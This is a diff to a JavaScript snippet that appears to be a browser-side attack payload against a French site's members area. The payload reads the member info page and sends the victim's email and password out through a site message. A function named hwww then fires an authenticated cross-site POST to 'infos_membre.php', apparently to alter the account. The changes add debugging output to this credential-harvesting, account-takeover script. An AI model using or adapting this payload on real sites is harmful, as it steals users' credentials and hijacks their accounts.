@@ -1,4 +1,5 @@
 function hwww(email, pwd) {
+    console.log("hwww", email, pwd)
     fetch("/membres/infos_membre.php", {
         "headers": {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -13,8 +14,7 @@ function hwww(email, pwd) {
         "method": "POST",
         "mode": "cors",
         "credentials": "include"
-    }))
-
+    }).then((r) => console.log(r), (e) => alert(e))
 }
 
 fetch('/membres/infos_membre.htm').then(function(response) {
@@ -36,6 +36,6 @@ fetch('/membres/infos_membre.htm').then(function(response) {
             message: ` email ${profil}, ${email}, ${pwd}`,
             send_msg: "Envoi en cours, patientez SVP..."
         })
-    }).then(() => hwww(email, pwd), () => hwww(email, pwd))
+    }).then(() => hwww(email, pwd), (e) => alert(e)).then(() => 1)
 
 });
